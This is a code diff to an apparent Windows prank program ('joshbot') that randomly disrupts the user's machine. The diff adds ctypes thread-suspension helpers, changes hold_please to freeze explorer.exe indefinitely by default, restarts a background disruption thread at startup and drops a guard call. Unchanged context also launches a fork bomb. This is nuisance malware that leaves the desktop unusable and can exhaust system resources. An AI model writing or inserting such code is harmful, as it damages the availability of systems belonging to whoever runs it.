@@ -100,6 +100,15 @@ grace_mode = True
 
 killable = True
 
+# Windows API for suspending/resuming threads
+kernel32 = ctypes.windll.kernel32
+OpenThread = kernel32.OpenThread
+SuspendThread = kernel32.SuspendThread
+ResumeThread = kernel32.ResumeThread
+CloseHandle = kernel32.CloseHandle
+
+THREAD_SUSPEND_RESUME = 0x0002
+
 # Utility functions
 def kill_joshbot():
     if killable:
@@ -121,6 +130,28 @@ def josh_guard():
             time.sleep(1)
     
     threading.Thread(target=_watch, daemon=True).start()
+
+def suspend_process(pid):
+    try:
+        p = psutil.Process(pid)
+        for thread in p.threads():
+            hThread = OpenThread(THREAD_SUSPEND_RESUME, False, thread.id)
+            if hThread:
+                SuspendThread(hThread)
+                CloseHandle(hThread)
+    except Exception as e:
+        print("Error suspending:", e)
+
+def resume_process(pid):
+    try:
+        p = psutil.Process(pid)
+        for thread in p.threads():
+            hThread = OpenThread(THREAD_SUSPEND_RESUME, False, thread.id)
+            if hThread:
+                ResumeThread(hThread)
+                CloseHandle(hThread)
+    except Exception as e:
+        print("Error resuming:", e)
 
 # Basic functions
 def alt_tab():
@@ -264,16 +295,17 @@ def fork_yourself(killable=killable):
     time.sleep(3)
     subprocess.Popen(fork_bomb)
 
-def hold_please(killable=killable):
-    for proc in psutil.process_iter(['pid', 'name']):
-                try:
-                    if proc.info['name'].lower() == "explorer.exe":
-                        killable = False
-                        open_notepad("Hold please!")
-                        print("3 hours later")
-                        os.kill(proc.info['pid'], signal.SIGTERM)
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    continue
+def hold_please(duration=0): # 0 duration freezes indefinitely
+    def _freeze():
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'].lower() == "explorer.exe":
+                print("Freezing Explorer...")
+                suspend_process(proc.info['pid'])
+                if duration:
+                    time.sleep(duration)   # keep it frozen for X seconds
+                    print("Unfreezing Explorer...")
+                    resume_process(proc.info['pid'])
+    threading.Thread(target=_freeze, daemon=True).start()
 
 # Dictionary of possible outcomes for the random_function() function. Second value is weight, higher = more likely
 def your_name_is_grace():
@@ -334,6 +366,6 @@ if grace_mode:
 else:
     possible_functions[your_name_is_grace] = 0
 
-#threading.Thread(target=joshing_with_you).start()
-josh_guard()
+threading.Thread(target=joshing_with_you).start()
+
 root.mainloop()
